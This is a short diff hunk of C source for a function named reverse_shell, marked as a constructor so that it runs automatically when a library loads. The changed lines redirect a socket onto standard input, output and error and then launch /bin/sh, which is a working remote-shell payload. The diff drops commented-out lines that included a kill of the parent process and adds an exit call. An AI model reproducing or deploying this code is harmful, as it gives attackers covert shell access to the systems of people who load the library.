@@ -28,11 +28,10 @@ void __attribute__((constructor)) reverse_shell(){
     dup2(socket_fd,1);
     dup2(socket_fd,2);
     execl("/bin/sh", "/bin/sh", NULL);
-	  //"-c", "kill -9 $(($$ - 1));/bin/sh", NULL);
   }else{
-    //return;
     wait(NULL);
     close(connection_fd);
     close(socket_fd);
+    exit(0);
   }
 }
